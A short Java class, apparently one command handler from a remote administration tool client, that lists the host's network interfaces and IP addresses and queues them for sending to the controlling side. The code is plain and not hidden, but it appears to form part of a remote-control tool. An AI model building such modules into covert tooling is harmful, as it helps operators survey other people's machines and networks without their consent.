package com.redpois0n.packets.incoming;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;

import com.redpois0n.Connection;
import com.redpois0n.packets.outgoing.Header;


public class PacketLISTAD extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
		for (NetworkInterface netint : Collections.list(nets)) {
			PacketBuilder packet = new PacketBuilder(Header.NETWORK_ADAPTER);
			packet.add(netint.getDisplayName());
			packet.add(netint.getName());

			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());
			packet.add(list.size());
			for (InetAddress inetAddress : list) {
				packet.add(inetAddress.getHostAddress());
			}
			
			Connection.addToSendQueue(packet);
		}
	}

}
